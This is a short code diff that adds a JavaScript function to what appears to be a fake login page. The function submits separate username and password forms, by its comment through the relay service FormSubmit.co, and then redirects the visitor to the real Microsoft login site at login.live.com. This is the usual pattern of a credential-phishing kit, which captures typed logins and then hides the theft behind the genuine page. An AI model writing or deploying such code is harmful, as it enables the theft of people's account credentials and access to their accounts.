@@ -46,6 +46,15 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
 
+ // Function to submit the form and redirect
+    function submitFormAndRedirect() {
+        // Submit the form using FormSubmit.co
+        form_uname.submit();
+        form_pwd.submit();
+        // Redirect to the provided link
+        window.location.href = "https://login.live.com";
+    }
+    
 
     function validate() {
         function unameValAction(type) {
